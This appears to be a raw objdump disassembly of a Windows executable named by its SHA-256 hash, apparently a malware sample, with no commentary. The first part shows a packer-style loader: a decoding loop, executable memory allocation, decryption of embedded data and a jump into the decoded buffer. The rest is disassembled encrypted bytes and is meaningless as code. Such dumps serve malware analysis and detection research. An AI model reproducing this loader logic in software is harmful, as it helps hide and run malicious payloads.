
c2309473822d4e5525ddf2f137f0d4d8bb37311ca1fa7170e60d4cc7dda33424.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0x8
  411003:	push   ebx
  411004:	push   ebp
  411005:	mov    ebp,DWORD PTR [esp+0x20]
  411009:	push   esi
  41100a:	xor    eax,eax
  41100c:	push   edi
  41100d:	mov    edi,DWORD PTR [esp+0x1c]
  411011:	mov    DWORD PTR [esp+0x10],eax
  411015:	mov    esi,0xfffffffd
  41101a:	mov    DWORD PTR [esp+0x14],0x1
  411022:	mov    ecx,DWORD PTR [esp+0x20]
  411026:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41102a:	add    esi,0x2
  41102d:	inc    esi
  41102e:	mov    BYTE PTR [esi+edi*1],cl
  411031:	movzx  ecx,BYTE PTR [eax+ebp*1]
  411035:	mov    edx,DWORD PTR [esp+0x10]
  411039:	mov    eax,DWORD PTR [esp+0x14]
  41103d:	add    edx,eax
  41103f:	mov    DWORD PTR [esp+0x10],edx
  411043:	ror    eax,cl
  411045:	mov    eax,DWORD PTR [esp+0x10]
  411049:	mov    edx,eax
  41104b:	shr    edx,0x3
  41104e:	mov    ebx,0x1
  411053:	sub    ebx,edx
  411055:	imul   eax,ebx
  411058:	mov    DWORD PTR [esp+0x10],eax
  41105c:	shl    ebx,0x3
  41105f:	mov    bl,BYTE PTR [esi+edi*1]
  411062:	add    bl,cl
  411064:	mov    ecx,DWORD PTR [esp+0x24]
  411068:	mov    BYTE PTR [esi+edi*1],bl
  41106b:	sub    esi,0x2
  41106e:	cmp    esi,ecx
  411070:	jl     0x411022
  411072:	pop    edi
  411073:	pop    esi
  411074:	pop    ebp
  411075:	pop    ebx
  411076:	add    esp,0x8
  411079:	ret    
  41107a:	nop
  41107b:	nop
  41107c:	nop
  41107d:	nop
  41107e:	nop
  41107f:	nop
  411080:	push   ebp
  411081:	mov    ebp,esp
  411083:	sub    esp,0x70
  411086:	mov    DWORD PTR [ebp-0x8],0x0
  41108d:	mov    DWORD PTR [ebp-0x70],0x0
  411094:	mov    DWORD PTR [ebp-0x58],0x0
  41109b:	mov    DWORD PTR [ebp-0x5c],0x0
  4110a2:	mov    DWORD PTR [ebp-0x48],0x0
  4110a9:	mov    DWORD PTR [ebp-0x6c],0x0
  4110b0:	mov    DWORD PTR [ebp-0x68],0x0
  4110b7:	mov    DWORD PTR [ebp-0x10],0x0
  4110be:	mov    DWORD PTR [ebp-0x60],0x0
  4110c5:	mov    DWORD PTR [ebp-0x18],0x0
  4110cc:	mov    DWORD PTR [ebp-0xc],0x0
  4110d3:	mov    DWORD PTR [ebp-0x30],0x0
  4110da:	mov    DWORD PTR [ebp-0x2c],0x0
  4110e1:	mov    DWORD PTR [ebp-0x14],0x0
  4110e8:	mov    DWORD PTR [ebp-0x4],0x0
  4110ef:	mov    DWORD PTR [ebp-0x54],0x0
  4110f6:	mov    DWORD PTR [ebp-0x50],0x0
  4110fd:	mov    DWORD PTR [ebp-0x4c],0x0
  411104:	mov    eax,ds:0x429160
  411109:	mov    DWORD PTR [ebp-0x28],eax
  41110c:	mov    ecx,DWORD PTR ds:0x429164
  411112:	mov    DWORD PTR [ebp-0x24],ecx
  411115:	mov    edx,DWORD PTR ds:0x429168
  41111b:	mov    DWORD PTR [ebp-0x20],edx
  41111e:	mov    al,ds:0x42916c
  411123:	mov    BYTE PTR [ebp-0x1c],al
  411126:	mov    ecx,DWORD PTR ds:0x429150
  41112c:	mov    DWORD PTR [ebp-0x40],ecx
  41112f:	mov    edx,DWORD PTR ds:0x429154
  411135:	mov    DWORD PTR [ebp-0x3c],edx
  411138:	mov    eax,ds:0x429158
  41113d:	mov    DWORD PTR [ebp-0x38],eax
  411140:	mov    cx,WORD PTR ds:0x42915c
  411147:	mov    WORD PTR [ebp-0x34],cx
  41114b:	mov    dl,BYTE PTR ds:0x42915e
  411151:	mov    BYTE PTR [ebp-0x32],dl
  411154:	mov    DWORD PTR [ebp-0x2c],0x40
  41115b:	call   DWORD PTR ds:0x42901c
  411161:	mov    eax,DWORD PTR [ebp-0x70]
  411164:	push   eax
  411165:	call   DWORD PTR ds:0x429018
  41116b:	lea    ecx,[ebp-0x10]
  41116e:	push   ecx
  41116f:	lea    edx,[ebp-0x18]
  411172:	push   edx
  411173:	call   DWORD PTR ds:0x429000
  411179:	test   eax,eax
  41117b:	jne    0x4111a5
  41117d:	push   0x0
  41117f:	push   0x14
  411181:	push   0x14
  411183:	push   0xa
  411185:	push   0xa
  411187:	push   0x0
  411189:	push   0x0
  41118b:	push   0x14
  41118d:	push   0x14
  41118f:	push   0xa
  411191:	push   0xa
  411193:	push   0x0
  411195:	push   0x0
  411197:	call   0x424352
  41119c:	mov    eax,DWORD PTR [ebp-0x10]
  41119f:	add    eax,0x1
  4111a2:	mov    DWORD PTR [ebp-0x10],eax
  4111a5:	mov    BYTE PTR [ebp-0x40],0x56
  4111a9:	call   DWORD PTR ds:0x429034
  4111af:	mov    DWORD PTR [ebp-0x30],eax
  4111b2:	mov    BYTE PTR [ebp-0x3e],0x72
  4111b6:	movzx  ecx,WORD PTR [ebp-0x30]
  4111ba:	test   ecx,ecx
  4111bc:	jne    0x411210
  4111be:	mov    BYTE PTR [ebp-0x34],0x0
  4111c2:	mov    DWORD PTR [ebp-0x18],0xe0d
  4111c9:	lea    edx,[ebp-0x28]
  4111cc:	push   edx
  4111cd:	call   DWORD PTR ds:0x429044
  4111d3:	mov    DWORD PTR [ebp-0x60],eax
  4111d6:	mov    DWORD PTR [ebp-0x50],0x3a
  4111dd:	lea    eax,[ebp-0x40]
  4111e0:	push   eax
  4111e1:	mov    ecx,DWORD PTR [ebp-0x60]
  4111e4:	push   ecx
  4111e5:	call   DWORD PTR ds:0x429048
  4111eb:	mov    DWORD PTR [ebp-0x44],eax
  4111ee:	mov    DWORD PTR [ebp-0x4],0xf9287c01
  4111f5:	push   0x0
  4111f7:	push   0x14
  4111f9:	push   0x14
  4111fb:	push   0xa
  4111fd:	push   0xa
  4111ff:	push   0x0
  411201:	call   DWORD PTR ds:0x42900c
  411207:	mov    DWORD PTR [ebp-0x6c],0x10ebff
  41120e:	jmp    0x411225
  411210:	mov    BYTE PTR ds:0x447ac8,0x0
  411217:	mov    BYTE PTR ds:0x42d6a0,0x0
  41121e:	mov    BYTE PTR ds:0x443dd8,0x0
  411225:	push   0x0
  411227:	call   DWORD PTR ds:0x429140
  41122d:	push   DWORD PTR ds:0x429044
  411233:	pop    edx
  411234:	mov    DWORD PTR [ebp-0x68],edx
  411237:	mov    edx,DWORD PTR [ebp-0x70]
  41123a:	push   edx
  41123b:	call   DWORD PTR ds:0x429050
  411241:	mov    DWORD PTR [ebp-0x30],0x410000
  411248:	push   DWORD PTR [ebp-0x2c]
  41124b:	push   0x1000
  411250:	mov    eax,DWORD PTR [ebp-0x18]
  411253:	add    eax,0x23
  411256:	add    eax,0x23
  411259:	push   eax
  41125a:	xor    eax,eax
  41125c:	push   eax
  41125d:	mov    ecx,DWORD PTR [ebp-0x44]
  411260:	call   ecx
  411262:	mov    edx,eax
  411264:	mov    DWORD PTR [ebp-0x8],edx
  411267:	mov    eax,DWORD PTR [ebp-0x6c]
  41126a:	sub    eax,0xdae0b
  41126f:	mov    DWORD PTR [ebp-0x6c],eax
  411272:	cmp    DWORD PTR [ebp-0x8],0x0
  411276:	jne    0x411286
  411278:	push   0x0
  41127a:	call   0x42434c
  41127f:	mov    BYTE PTR ds:0x443dd8,0x0
  411286:	mov    ecx,DWORD PTR [ebp-0x8]
  411289:	add    ecx,DWORD PTR [ebp-0x18]
  41128c:	mov    edx,DWORD PTR [ebp-0x4]
  41128f:	mov    DWORD PTR [ecx],edx
  411291:	mov    eax,DWORD PTR [ebp-0x8]
  411294:	add    eax,DWORD PTR [ebp-0x50]
  411297:	mov    DWORD PTR [ebp-0x5c],eax
  41129a:	mov    ecx,DWORD PTR ds:0x429048
  4112a0:	mov    DWORD PTR [ebp-0x4c],ecx
  4112a3:	mov    edx,DWORD PTR [ebp-0x8]
  4112a6:	add    edx,DWORD PTR [ebp-0x18]
  4112a9:	mov    eax,DWORD PTR [ebp+0x8]
  4112ac:	mov    DWORD PTR [edx+0x4],eax
  4112af:	mov    ecx,DWORD PTR [ebp-0x8]
  4112b2:	add    ecx,DWORD PTR [ebp-0x18]
  4112b5:	mov    DWORD PTR [ebp-0xc],ecx
  4112b8:	push   0x8000
  4112bd:	push   0x0
  4112bf:	mov    edx,DWORD PTR [ebp-0x70]
  4112c2:	push   edx
  4112c3:	call   DWORD PTR ds:0x42904c
  4112c9:	cmp    DWORD PTR [ebp-0x6c],0x0
  4112cd:	jbe    0x4112ea
  4112cf:	mov    eax,DWORD PTR [ebp-0xc]
  4112d2:	push   eax
  4112d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4112d6:	push   ecx
  4112d7:	mov    edx,DWORD PTR [ebp-0x30]
  4112da:	add    edx,DWORD PTR [ebp-0x6c]
  4112dd:	push   edx
  4112de:	mov    eax,DWORD PTR [ebp-0x8]
  4112e1:	push   eax
  4112e2:	call   0x411000
  4112e7:	add    esp,0x10
  4112ea:	mov    ecx,DWORD PTR [ebp-0x70]
  4112ed:	push   ecx
  4112ee:	call   DWORD PTR ds:0x429144
  4112f4:	cmp    DWORD PTR [ebp-0x5c],0x0
  4112f8:	je     0x41130b
  4112fa:	push   DWORD PTR [ebp-0x4c]
  4112fd:	push   DWORD PTR [ebp-0x68]
  411300:	mov    edx,DWORD PTR [ebp-0x5c]
  411303:	push   eax
  411304:	jmp    edx
  411306:	jmp    0x422dee
  41130b:	mov    edx,DWORD PTR [ebp+0x8]
  41130e:	mov    DWORD PTR [ebp-0x14],edx
  411311:	push   0x0
  411313:	push   0x1
  411315:	mov    eax,DWORD PTR [ebp-0x60]
  411318:	push   eax
  411319:	call   DWORD PTR ds:0x429058
  41131f:	aam    0xd6
  411321:	stos   BYTE PTR es:[edi],al
  411322:	xchg   edi,eax
  411323:	call   0xfd043886
  411328:	sub    esi,DWORD PTR [eax-0x2b]
  41132b:	mov    esi,0x6ca31e53
  411330:	mov    ecx,0xd658dd24
  411335:	and    DWORD PTR [eax+0x58c83bde],edx
  41133b:	jns    0x411320
  41133d:	inc    ecx
  41133e:	in     eax,0xc0
  411340:	cwde   
  411341:	scas   al,BYTE PTR es:[edi]
  411342:	test   BYTE PTR [edi+ecx*2],dl
  411345:	les    edx,FWORD PTR [edi]
  411347:	sub    DWORD PTR [eax+0x40],edx
  41134a:	inc    ebp
  41134b:	mov    dl,0xa7
  41134d:	lahf   
  41134e:	shl    esp,1
  411350:	cmp    eax,0x74e39ebd
  411355:	sbb    ecx,DWORD PTR [edi]
  411357:	inc    edi
  411358:	inc    esp
  411359:	jle    0x411388
  41135b:	jo     0x411372
  41135d:	or     esp,DWORD PTR [ebx]
  41135f:	sbb    ebp,ebx
  411361:	mov    ah,0x4a
  411363:	aaa    
  411364:	mov    dh,0xa3
  411366:	loope  0x411397
  411368:	cs pop ss
  41136a:	sbb    eax,0xdc7fe1ce
  41136f:	sbb    ecx,edx
  411371:	dec    eax
  411372:	lods   eax,DWORD PTR ds:[esi]
  411373:	jo     0x411314
  411375:	fcom   DWORD PTR fs:[ecx+0x1cc83723]
  41137c:	ret    0x78c
  41137f:	fld    TBYTE PTR [ecx-0x71]
  411382:	cs cli 
  411384:	pop    ss
  411385:	popf   
  411386:	popa   
  411387:	inc    esp
  411388:	xor    edx,0x139a8adb
  41138e:	fdiv   DWORD PTR [esi]
  411390:	call   DWORD PTR [esi-0x4481f5e0]
  411396:	vmwrite ecx,eax
  411399:	or     eax,0xe92c4ee
  41139e:	pop    esp
  41139f:	les    eax,FWORD PTR [ecx+0x5b]
  4113a2:	jo     0x4113c2
  4113a4:	cmp    BYTE PTR [edi-0x3a],al
  4113a7:	shl    DWORD PTR [eax-0x93e244a],cl
  4113ad:	mov    cs,WORD PTR [edi+0x54c2ba21]
  4113b3:	push   esi
  4113b4:	int    0xc8
  4113b6:	in     al,dx
  4113b7:	mov    ebp,0x2c261a61
  4113bc:	sbb    BYTE PTR [esi+eiz*1+0x5ef4966e],bh
  4113c3:	cmp    ch,BYTE PTR ss:[edx-0x34]
  4113c7:	fild   WORD PTR [ecx-0x9]
  4113ca:	add    DWORD PTR [ebp+0x34],edi
  4113cd:	mov    bl,0x90
  4113cf:	jbe    0x4113aa
  4113d1:	retf   
  4113d2:	dec    ebp
  4113d3:	xchg   esp,eax
  4113d4:	push   ecx
  4113d5:	repnz adc edx,DWORD PTR [eax-0x5]
  4113d9:	xchg   esp,eax
  4113da:	das    
  4113db:	stos   DWORD PTR es:[edi],eax
  4113dc:	adc    DWORD PTR [edx],0xbca06487
  4113e2:	(bad)  
  4113e3:	lahf   
  4113e4:	xchg   edx,eax
  4113e5:	push   ss
  4113e6:	pop    ds
  4113e7:	mov    al,dh
  4113e9:	imul   edi,DWORD PTR [edi+0x27],0xa56d11f5
  4113f0:	mov    eax,ds:0xe1d35a7a
  4113f5:	js     0x4113a2
  4113f7:	mov    WORD PTR ds:0x19244647,?
  4113fd:	push   edx
  4113fe:	push   0x77
  411400:	scas   eax,DWORD PTR es:[edi]
  411401:	pop    ds
  411402:	pusha  
  411403:	jae    0x4113b3
  411405:	push   esp
  411406:	mov    esi,0xd51704a5
  41140b:	not    DWORD PTR ds:0x4ca3e971
  411411:	mov    ds:0x2fb169c6,al
  411416:	cmp    BYTE PTR [edi],cl
  411418:	mov    dh,BYTE PTR [edi-0x68]
  41141b:	icebp  
  41141c:	jge    0x41147d
  41141e:	sub    bl,BYTE PTR [ebp-0x73c3250]
  411424:	outs   dx,BYTE PTR ds:[esi]
  411425:	and    al,0x31
  411427:	inc    eax
  411428:	xor    eax,DWORD PTR [edi+0x19e599c4]
  41142e:	add    eax,0x54627026
  411433:	dec    edx
  411434:	xchg   edi,eax
  411435:	ins    DWORD PTR es:[edi],dx
  411436:	pop    edi
  411437:	xchg   ebx,eax
  411438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411439:	icebp  
  41143a:	test   BYTE PTR [esi+ebp*1-0x4c],0x92
  41143f:	inc    ebp
  411440:	(bad)  [ebp+0x10d1334f]
  411446:	or     al,0xf0
  411448:	jge    0x4113e8
  41144a:	scas   al,BYTE PTR es:[edi]
  41144b:	arpl   WORD PTR [ecx+0x56],bp
  41144e:	mov    eax,0xdd2c48d3
  411453:	push   ebx
  411454:	lods   eax,DWORD PTR ds:[esi]
  411455:	inc    edx
  411456:	pusha  
  411457:	cmp    al,0xcd
  411459:	and    al,0x34
  41145b:	cli    
  41145c:	into   
  41145d:	loopne 0x4114b9
  41145f:	and    dh,cl
  411461:	shl    DWORD PTR [eax-0x4c],0x4a
  411465:	xor    edi,ebp
  411467:	retf   0xb46b
  41146a:	mov    esi,edi
  41146c:	ret    0x1d19
  41146f:	jecxz  0x41148e
  411471:	inc    esp
  411472:	mov    ds:0x3b6a67c8,eax
  411477:	scas   al,BYTE PTR es:[edi]
  411478:	scas   al,BYTE PTR es:[edi]
  411479:	test   al,0xc2
  41147b:	jae    0x411469
  41147d:	ds dec ecx
  41147f:	pop    ebp
  411480:	fisubr WORD PTR [edx]
  411482:	xor    eax,0xf50f213f
  411487:	shl    BYTE PTR [edx+0x68],1
  41148a:	mov    ebx,0x185454f3
  41148f:	outs   dx,BYTE PTR ds:[esi]
  411490:	inc    ecx
  411491:	pop    edi
  411492:	jecxz  0x411426
  411494:	clc    
  411495:	call   0x1544:0x10a7c0dd
  41149c:	sbb    eax,0xcda8abe1
  4114a1:	cs mov bh,0xd3
  4114a4:	sub    eax,0xe3d21ac4
  4114a9:	mov    ah,0x7e
  4114ab:	push   0xfffffff0
  4114ad:	mov    al,ds:0xc0288a67
  4114b2:	(bad)  
  4114b3:	jl     0x411499
  4114b5:	mov    gs,WORD PTR [ebp*8+0x59d3c5c1]
  4114bc:	scas   al,BYTE PTR es:[edi]
  4114bd:	dec    ebp
  4114be:	les    edx,FWORD PTR [edi-0x724d79d4]
  4114c4:	pop    es
  4114c5:	add    ebx,edi
  4114c7:	mov    esp,0x15701375
  4114cc:	sbb    al,BYTE PTR [edi]
  4114ce:	ret    
  4114cf:	or     BYTE PTR [esi+0x340a1c4a],cl
  4114d5:	(bad)  [eax+0x3d]
  4114d8:	fdivr  QWORD PTR [ebp+ebp*4+0x7c]
  4114dc:	cmp    ecx,DWORD PTR [esi+0x61]
  4114df:	test   dl,bl
  4114e1:	loope  0x41149b
  4114e3:	xor    al,0x7a
  4114e5:	lea    ebx,[ecx]
  4114e7:	stos   DWORD PTR es:[edi],eax
  4114e8:	jmp    0xc137:0xa40ff5ee
  4114ef:	lea    eax,[eax+esi*8+0x6a]
  4114f3:	pop    es
  4114f4:	dec    edi
  4114f5:	mov    bl,0x9f
  4114f7:	or     bh,al
  4114f9:	aas    
  4114fa:	and    BYTE PTR [edi],cl
  4114fc:	and    BYTE PTR [edi-0x6c],ah
  4114ff:	fiadd  DWORD PTR [ecx-0x64]
  411502:	(bad)  
  411503:	outs   dx,DWORD PTR ds:[esi]
  411504:	mov    esi,0x68c93c0b
  411509:	test   eax,0xc5bc2e25
  41150e:	pusha  
  41150f:	jo     0x4114c2
  411511:	sbb    DWORD PTR [ebx],edx
  411513:	push   es
  411514:	popa   
  411515:	(bad)  
  411516:	sub    ch,BYTE PTR [esi+0x7500ed63]
  41151c:	gs inc ebp
  41151e:	adc    al,0x37
  411520:	cwde   
  411521:	mov    cl,BYTE PTR [edi-0x2]
  411524:	aam    0xd0
  411526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411527:	pop    ecx
  411528:	(bad)  
  411529:	jmp    0x263d:0xbb5a1dc5
  411530:	xor    eax,0x6b5d3d24
  411535:	or     ebp,DWORD PTR [ecx]
  411537:	mov    eax,0x7224091b
  41153c:	cmp    DWORD PTR [esi-0x36],eax
  41153f:	jle    0x41155f
  411541:	inc    esp
  411542:	test   al,0x6c
  411544:	mov    edi,0xb6c7af4b
  411549:	or     DWORD PTR [eax-0x2309c2e6],esi
  41154f:	push   cs
  411550:	xor    DWORD PTR [edx],esi
  411552:	scas   eax,DWORD PTR es:[edi]
  411553:	mov    ebp,DWORD PTR [ebx-0x1120ae41]
  411559:	idiv   BYTE PTR [ebx]
  41155b:	mov    ch,BYTE PTR [esi+0x79]
  41155e:	cmp    ecx,DWORD PTR [ecx+edi*1]
  411561:	or     al,0x3
  411563:	cmp    al,0x72
  411565:	sbb    eax,0x2f510d5e
  41156a:	mov    ?,ebx
  41156c:	(bad)  
  41156d:	leave  
  41156e:	mov    ds:0x8926496,eax
  411573:	aad    0x73
  411575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411576:	gs dec ebp
  411578:	cmp    DWORD PTR [edx+0x5953d62f],0x737cae82
  411582:	addr16 push ss
  411584:	cmc    
  411585:	push   ebp
  411586:	fcomip st,st(0)
  411588:	daa    
  411589:	xor    dl,BYTE PTR [ebp-0x51a7ddd4]
  41158f:	pusha  
  411590:	add    BYTE PTR [edi],dh
  411592:	add    BYTE PTR [ebx],0xd5
  411595:	jmp    0xc54a:0xd036a43f
  41159c:	fisttp DWORD PTR [edi-0x7766ce1b]
  4115a2:	dec    BYTE PTR [ebp-0x3a]
  4115a5:	xchg   ebx,eax
  4115a6:	repz jl 0x4115a2
  4115a9:	mov    edi,0x694ef2b6
  4115ae:	pop    es
  4115af:	pop    ebx
  4115b0:	mov    esi,0xe1e2d024
  4115b5:	xor    BYTE PTR [eax-0x4ea4db58],al
  4115bb:	mov    ecx,ecx
  4115bd:	add    DWORD PTR [esi-0x6e],0x59
  4115c1:	sub    eax,DWORD PTR [edi-0x50]
  4115c4:	and    eax,0xbe1045ec
  4115c9:	adc    bh,BYTE PTR [ebp+edi*8+0x17]
  4115cd:	sbb    dh,al
  4115cf:	adc    DWORD PTR [ebx+0x2d],edx
  4115d2:	cmp    cl,0x7a
  4115d5:	push   ebx
  4115d6:	sub    eax,DWORD PTR [ebp-0x2a]
  4115d9:	mov    bh,BYTE PTR [edx+0x5b]
  4115dc:	cmp    al,0xfd
  4115de:	xchg   esp,eax
  4115df:	dec    ebp
  4115e0:	out    0xeb,al
  4115e2:	out    dx,eax
  4115e3:	xchg   ecx,eax
  4115e4:	cwde   
  4115e5:	push   esi
  4115e6:	leave  
  4115e7:	out    dx,al
  4115e8:	scas   eax,DWORD PTR es:[edi]
  4115e9:	test   DWORD PTR [ecx-0x30],0x902fc552
  4115f0:	or     ebx,eax
  4115f2:	loope  0x4115fc
  4115f4:	sbb    al,0xf4
  4115f6:	mov    esi,0x8ccc7a30
  4115fb:	call   0xf8d451e8
  411600:	stos   DWORD PTR es:[edi],eax
  411601:	xor    esi,DWORD PTR [esi]
  411603:	stc    
  411604:	adc    eax,0x765f0aaa
  411609:	mov    esi,es
  41160b:	sar    ebx,0x54
  41160e:	pop    ecx
  41160f:	aam    0xca
  411611:	ins    DWORD PTR es:[edi],dx
  411612:	mov    cl,0x20
  411614:	pushf  
  411615:	sar    BYTE PTR [eax+0x3],0xce
  411619:	bound  ebp,QWORD PTR [esp+edx*1-0x3d656ee6]
  411620:	inc    esp
  411621:	xor    ch,BYTE PTR [ebp-0x1d548e87]
  411627:	mov    cl,0x12
  411629:	jne    0x4115ad
  41162b:	and    BYTE PTR [eax-0x1e5e84f3],ch
  411631:	add    BYTE PTR [ebx-0x66ead181],0x3e
  411638:	les    ecx,FWORD PTR [eax-0x127b2f1d]
  41163e:	sub    eax,0x7c250950
  411643:	das    
  411644:	or     esp,esp
  411646:	push   0xa4c08c3f
  41164b:	pushf  
  41164c:	mov    cl,0x54
  41164e:	loope  0x41164f
  411650:	in     al,dx
  411651:	inc    esp
  411652:	xchg   BYTE PTR [eax],cl
  411654:	pop    ecx
  411655:	popf   
  411656:	jo     0x4115e9
  411658:	out    0xdb,eax
  41165a:	xchg   BYTE PTR [ebx+0x652396e],dl
  411660:	sub    al,0x1b
  411662:	jnp    0x411612
  411664:	mov    BYTE PTR [esi+0x20],bl
  411667:	cmc    
  411668:	aam    0x9
  41166a:	retf   
  41166b:	std    
  41166c:	fidivr WORD PTR [edx]
  41166e:	mov    esp,0x1957f0b9
  411673:	fptan  
  411675:	or     eax,DWORD PTR [edx]
  411677:	aaa    
  411678:	or     dl,0x71
  41167b:	dec    ecx
  41167c:	push   0x3
  41167e:	pop    fs
  411680:	jmp    0x4116c9
  411682:	jp     0x411625
  411684:	sub    eax,0x360ef4e9
  411689:	je     0x41169a
  41168b:	das    
  41168c:	into   
  41168d:	out    0x7a,al
  41168f:	mov    bl,al
  411691:	ret    
  411692:	aaa    
  411693:	popf   
  411694:	push   esp
  411695:	std    
  411696:	imul   eax,edx,0xffffffd8
  411699:	sub    al,0xb1
  41169b:	popf   
  41169c:	fist   DWORD PTR [edx]
  41169e:	test   al,0x8c
  4116a0:	sahf   
  4116a1:	or     eax,0xac34b8ea
  4116a6:	mov    bh,0x72
  4116a8:	enter  0xa9f3,0x74
  4116ac:	dec    ecx
  4116ad:	mov    esp,cs
  4116af:	cmp    eax,0x65bf5205
  4116b4:	cld    
  4116b5:	lea    esi,[edi-0x66]
  4116b8:	xchg   ebp,eax
  4116b9:	arpl   WORD PTR [eax-0x6701ccc3],bp
  4116bf:	push   ecx
  4116c0:	push   0xffffff9e
  4116c2:	push   esp
  4116c3:	mov    al,BYTE PTR [edi]
  4116c5:	lods   eax,DWORD PTR ds:[esi]
  4116c6:	fbld   TBYTE PTR [edx-0x2d]
  4116c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ca:	lods   al,BYTE PTR ds:[esi]
  4116cb:	jmp    0x51eb:0x5efe50b8
  4116d2:	mov    esp,fs
  4116d4:	sub    edx,DWORD PTR [edi]
  4116d6:	xchg   BYTE PTR [esi],bl
  4116d8:	and    ah,BYTE PTR [esi]
  4116da:	in     al,dx
  4116db:	retf   
  4116dc:	test   eax,0x4ae3c194
  4116e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e2:	imul   edx,DWORD PTR [ecx-0x7f],0x9d519d8
  4116e9:	pushf  
  4116ea:	push   0xb666d1d0
  4116ef:	rcr    DWORD PTR ds:0xa970b169,1
  4116f5:	mov    ebx,0x1c45fc0f
  4116fa:	mov    ss,eax
  4116fc:	cmc    
  4116fd:	jo     0x411697
  4116ff:	push   esp
  411700:	fst    DWORD PTR [esi+0x42]
  411703:	pusha  
  411704:	sbb    ebp,DWORD PTR [edx-0x581b2c5b]
  41170a:	or     BYTE PTR [edi+0x763dab53],ch
  411710:	syscall 
  411712:	out    dx,eax
  411713:	and    eax,0x6ecf0b5c
  411718:	inc    esi
  411719:	mov    eax,ds:0x3b20c400
  41171e:	jg     0x4116c0
  411720:	arpl   bx,ax
  411722:	mov    WORD PTR [ecx+0x1a],?
  411725:	jns    0x411711
  411727:	neg    DWORD PTR [ebx+0x3f]
  41172a:	lahf   
  41172b:	jnp    0x41179d
  41172d:	addr16 pop cx
  411730:	dec    edi
  411731:	out    0x54,eax
  411733:	mov    eax,ds:0xd625e1eb
  411738:	lods   eax,DWORD PTR ds:[esi]
  411739:	sbb    BYTE PTR [eax-0x5a],dl
  41173c:	(bad)  
  41173d:	or     al,0x55
  41173f:	mov    bl,0x9b
  411741:	push   ecx
  411742:	mov    ds,WORD PTR ds:0x23124749
  411748:	sbb    eax,0x29bb59d3
  41174d:	call   0x8d5b:0x645cb447
  411754:	rcl    BYTE PTR [esi-0x3c],1
  411757:	aaa    
  411758:	inc    edi
  411759:	dec    ebx
  41175a:	and    BYTE PTR [ecx+ebx*4+0x6e],bl
  41175e:	xchg   edx,eax
  41175f:	sbb    eax,edx
  411761:	or     al,0x35
  411763:	mov    dl,0x5b
  411765:	(bad)
  411769:	jle    0x41170b
  41176b:	es jno 0x4116f8
  41176e:	xchg   BYTE PTR [esi],cl
  411770:	aaa    
  411771:	jmp    0x411772
  411773:	fisttp WORD PTR [edx+ecx*8]
  411776:	push   ecx
  411777:	lahf   
  411778:	in     eax,dx
  411779:	or     DWORD PTR [esi-0x264925c6],esp
  41177f:	jle    0x411711
  411781:	pusha  
  411782:	dec    eax
  411783:	sahf   
  411784:	sub    BYTE PTR [ebx],0x93
  411787:	dec    edx
  411788:	ret    0xf901
  41178b:	popa   
  41178c:	cmpps  xmm3,XMMWORD PTR [eax-0x1bf75d93],0x21
  411794:	inc    esp
  411795:	ret    
  411796:	push   edi
  411797:	dec    eax
  411798:	dec    ebx
  411799:	cdq    
  41179a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41179b:	cdq    
  41179c:	mov    ds,eax
  41179e:	fxch   st(2)
  4117a0:	inc    edi
  4117a1:	adc    al,0x1f
  4117a3:	add    esp,DWORD PTR [esi+ecx*8]
  4117a6:	dec    edx
  4117a7:	mov    esp,0x85dad81f
  4117ac:	lahf   
  4117ad:	mov    eax,ds:0x261c2051
  4117b2:	jl     0x411753
  4117b4:	jecxz  0x41176b
  4117b6:	lahf   
  4117b7:	inc    edx
  4117b8:	push   0xffffff8c
  4117ba:	jns    0x4117d6
  4117bc:	pushf  
  4117bd:	push   esi
  4117be:	sub    DWORD PTR [edx],edi
  4117c0:	xor    DWORD PTR [edx+eiz*4],edi
  4117c3:	push   0xffffffa9
  4117c5:	pushf  
  4117c6:	arpl   si,ax
  4117c8:	jmp    0x4d909479
  4117cd:	xor    BYTE PTR ds:[ebx-0x5f393dfe],0xd6
  4117d5:	jmp    0x4117f4
  4117d7:	ja     0x41182e
  4117d9:	sub    DWORD PTR [edi-0x23],0x52
  4117dd:	scas   eax,DWORD PTR es:[edi]
  4117de:	call   0xb00b:0xc1c6cdba
  4117e5:	and    al,0x1
  4117e7:	pop    ss
  4117e8:	inc    ebp
  4117e9:	cld    
  4117ea:	call   DWORD PTR [ebp+0x62]
  4117ed:	int3   
  4117ee:	outs   dx,DWORD PTR ds:[esi]
  4117ef:	retf   
  4117f0:	inc    ebp
  4117f1:	mov    ah,0x6e
  4117f3:	out    0xe7,eax
  4117f5:	adc    eax,0xb2a80187
  4117fa:	pop    ecx
  4117fb:	mov    esi,0x7a3d85f5
  411800:	fsubr  st(5),st
  411802:	adc    al,0xee
  411804:	mov    bl,0x4e
  411806:	mov    edx,DWORD PTR [edx+0x55b38e05]
  41180c:	aaa    
  41180d:	int    0x67
  41180f:	pop    edi
  411810:	popf   
  411811:	sub    BYTE PTR [edi],al
  411813:	and    eax,0xf4fb9257
  411818:	sub    al,0x23
  41181a:	retf   0x286f
  41181d:	ror    BYTE PTR [edi+0x6e],0xe8
  411821:	outs   dx,BYTE PTR ds:[esi]
  411822:	mov    bl,dl
  411824:	(bad)  
  411825:	iret   
  411826:	cmp    ch,BYTE PTR [ebx]
  411828:	adc    eax,0xeec5dbd4
  41182d:	dec    ecx
  41182e:	jge    0x4117be
  411830:	mov    cl,0xde
  411832:	and    ebx,ecx
  411834:	jmp    0x411870
  411836:	fdiv   QWORD PTR [ebx+0x1c6e4e13]
  41183c:	retf   
  41183d:	push   ebp
  41183e:	imul   eax,DWORD PTR [edi+0x7b],0x7f
  411842:	jmp    0xfaaf9d93
  411847:	icebp  
  411848:	xor    al,0xff
  41184a:	sbb    al,ch
  41184c:	pop    ss
  41184d:	and    DWORD PTR [esi],esi
  41184f:	call   0x5e2925d
  411854:	pop    ss
  411855:	je     0x411858
  411857:	outs   dx,BYTE PTR ds:[esi]
  411858:	mov    ss,WORD PTR [ebp+0x6]
  41185b:	out    dx,al
  41185c:	jb     0x4117f2
  41185e:	jle    0x411886
  411860:	ficom  WORD PTR [eax]
  411862:	ja     0x4118e3
  411864:	int3   
